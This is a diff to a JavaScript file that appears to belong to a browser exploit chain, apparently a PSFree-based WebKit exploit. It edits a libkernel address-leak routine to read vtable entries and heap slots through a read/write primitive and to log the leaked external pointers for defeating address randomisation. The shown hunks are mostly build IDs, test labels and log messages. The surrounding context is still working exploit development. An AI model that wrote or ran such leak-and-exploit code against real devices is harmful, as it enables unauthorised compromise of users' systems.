@@ -38,7 +38,7 @@ import {
 } from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829n";
+const BUILD_ID = "rw-20250829o";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -340,7 +340,7 @@ const MANUAL_TESTS = [
     { id: "elf", group: "base", label: "ELF @ base" },
     { id: "native", group: "base", label: "nativeFn code" },
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
-    { id: "leak-lk", group: "base", label: "Leak scan LK" },
+    { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "paste-lk", group: "base", label: "Paste libkernel" },
     { id: "libkernel", group: "base", label: "libkernel" },
@@ -1712,7 +1712,7 @@ function logLibkernelMissSummary(chunk, scanStateObj, webkitBase, nativeFn) {
     const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
     for (let ci = 0; ci < Math.min(cands.length, 6); ci++)
         mark("LK-GUESS", cands[ci].hex + " (" + cands[ci].why + ")");
-    mark("LK-HINT", "index_cal → vtable ptr → paste here (no blind reads)");
+    mark("LK-HINT", "Leak+vtable LK on rw — or cal 2e for EXT-PTR lines");
     if (stateEl) {
         stateEl.textContent = "libkernel miss — open cal, paste vtable ext ptr";
         stateEl.className = "bad";
@@ -1745,7 +1745,7 @@ async function runLeakLkScan() {
     busy = true;
     setUi();
     leakScanState = null;
-    mark("LK-LEAK", "build=" + BUILD_ID + " — heap slots only (textarea/expm1/parseFloat)");
+    mark("LK-LEAK", "build=" + BUILD_ID + " — PSFree vtable[0..47] + heap slots");
     scanState("leak scan…");
     let ticks = 0;
     try {
@@ -1753,7 +1753,7 @@ async function runLeakLkScan() {
             const chunk = scanLibkernelLeakChunk(p, webkitBase, off, leakScanState, retained);
             leakScanState = chunk.state;
             if (chunk.phase === "leak-start")
-                mark("LK-LEAK", "targets=" + chunk.targets + " slots=0..0x100");
+                mark("LK-LEAK", "vtable+heap targets=" + chunk.targets);
             else if (chunk.phase === "leak")
                 scanState("leak tried=" + chunk.tried);
             if (chunk.done && chunk.lk) {
@@ -1762,9 +1762,12 @@ async function runLeakLkScan() {
                 break;
             }
             if (chunk.done) {
+                const ext = chunk.extList || (leakScanState && leakScanState.extList) || [];
+                for (let ei = 0; ei < ext.length; ei++)
+                    mark("LK-EXT", ext[ei].source + " → " + ext[ei].ptr);
                 mark("LK-LEAK-MISS", "tried=" + (chunk.tried || 0)
-                    + " — paste cal vtable ext ptr into hex box");
-                state("leak miss — paste cal ptr", "bad");
+                    + " ext=" + ext.length + " — paste LK-EXT into hex → Paste libkernel");
+                state("leak miss — paste LK-EXT ptr", "bad");
                 break;
             }
             if ((ticks & 15) === 0)
